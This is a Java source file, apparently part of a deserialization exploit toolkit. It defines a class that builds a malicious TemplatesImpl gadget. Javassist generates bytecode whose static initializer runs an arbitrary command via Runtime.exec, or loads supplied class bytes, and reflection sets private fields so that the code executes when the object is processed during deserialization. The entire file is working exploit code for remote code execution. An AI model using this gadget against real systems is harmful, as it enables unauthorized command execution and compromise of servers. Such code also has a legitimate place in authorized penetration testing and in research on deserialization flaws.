package xyz.eki.marshalexp.sink.jdk;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import xyz.eki.marshalexp.utils.MiscUtils;

import java.io.ByteArrayInputStream;
import java.lang.reflect.Field;

/**
 * getter -> remote class injection
 */
public class GTemplates {
    public static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getEvilTemplates(String cmd) throws Exception{
        String code = "{java.lang.Runtime.getRuntime().exec(\""+cmd+"\");}";
        ClassPool cp = ClassPool.getDefault();
        String className = MiscUtils.randomString(8);
        CtClass cc = cp.makeClass(MiscUtils.randomString(8));
        cc.setSuperclass(cp.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        cc.makeClassInitializer().insertBefore(code);
        byte[][] bytecodes = new byte[][]{cc.toBytecode()};


        TemplatesImpl templatesimpl = new TemplatesImpl();
        Field fieldByteCodes = templatesimpl.getClass().getDeclaredField("_bytecodes");
        fieldByteCodes.setAccessible(true);
        fieldByteCodes.set(templatesimpl, bytecodes);

        Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templatesimpl, className);

        Field fieldTfactory = templatesimpl.getClass().getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        return templatesimpl;
    }

    public static  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl getEvilTemplates(byte[] clzBytes) throws Exception{
        ClassPool cp = ClassPool.getDefault();
        CtClass cc = cp.makeClass(new ByteArrayInputStream(clzBytes));
        cc.setSuperclass(cp.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        byte[][] bytecodes = new byte[][]{cc.toBytecode()};

        TemplatesImpl templatesimpl = new TemplatesImpl();
        Field fieldByteCodes = templatesimpl.getClass().getDeclaredField("_bytecodes");
        fieldByteCodes.setAccessible(true);
        fieldByteCodes.set(templatesimpl, bytecodes);

        Field fieldName = templatesimpl.getClass().getDeclaredField("_name");
        fieldName.setAccessible(true);
        fieldName.set(templatesimpl, "test");

        Field fieldTfactory = templatesimpl.getClass().getDeclaredField("_tfactory");
        fieldTfactory.setAccessible(true);
        fieldTfactory.set(templatesimpl, Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl").newInstance());

        return templatesimpl;
    }
}
